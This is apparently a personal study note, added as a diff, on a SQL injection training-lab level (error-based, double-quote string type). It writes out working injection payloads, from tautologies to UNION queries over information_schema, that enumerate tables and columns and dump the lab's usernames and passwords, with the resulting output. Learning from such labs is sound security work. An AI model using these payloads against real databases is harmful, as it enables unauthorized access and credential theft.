@@ -1,0 +1,77 @@
+GET - 基于错误-双引号-字符型
+
+1 -> Dumb
+2 -> Angelina
+1' -> Dumb
+2' -> Angelina ??
+
+2"
+You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the right syntax to use near '"2"") LIMIT 0,1' at line 1
+
+1. back ground operation
+   "SELECT * FROM users WHERE id=("$id") LIMIT 0,1"
+
+2. think
+   eg1: force hit
+   ") or 1=("1
+    "SELECT * FROM users WHERE id=("") or 1=("1") LIMIT 0,1"
+   eg2: force hit and drop code behind
+    1") or 1=1 --+
+    "SELECT * FROM users WHERE id=("1") or 1=1 -- ") LIMIT 0,1"
+
+3. knowledge
+   sql 对于查询字符串中引号包含的值的处理，会先进行相应类型转换。 例如 int "123 or 1=1" , 会挨个保留(0-9），所以被转换成  123
+
+
+4. advanced step
+
+   a. query tables in db using the sql-inject:
+     information_schema 是元数据, 可以通过它来枚举获取信息哟
+
+     input:
+        ") union select 1,table_name,3 from information_schema.tables where table_schema='security' --+
+
+    output:
+        Your Org Input: ") union select 1,table_name,3 from information_schema.tables where table_schema='security' --
+        Your New Input: "") union select 1,table_name,3 from information_schema.tables where table_schema='security' -- "
+        sql query string : SELECT * FROM users WHERE id=("") union select 1,table_name,3 from information_schema.tables where table_schema='security' -- ") LIMIT 0,1
+        Your Login name:emails
+        Your Password:3
+
+    --> now we got that there is a table named 'emails' at the first index;
+
+   b.  join all tame name in one line:
+    group_concat can combine all result lines in one line
+     input:
+        ") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
+
+     output:
+         Your Org Input: ") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --
+         Your New Input: "") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- "
+         sql query string : SELECT * FROM users WHERE id=("") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- ") LIMIT 0,1
+         Your Login name:emails,referers,uagents,users
+         Your Password:3
+
+    --> now we got that all the tables in one-line;
+
+  c. enum the column info in table 'users':
+    input:
+        ") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
+
+    output:
+         Your Org Input: ") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --
+         Your New Input: "") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' -- "
+         sql query string : SELECT * FROM users WHERE id=("") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' -- ") LIMIT 0,1
+         Your Login name:id,username,password
+         Your Password:3
+
+  d. enum all the table 'users':
+     input:
+         ") union select 1,group_concat(username),group_concat(password) from users --+
+
+     output:
+         Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+         Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
+    --> Wholly shit！all info in users have been enum!
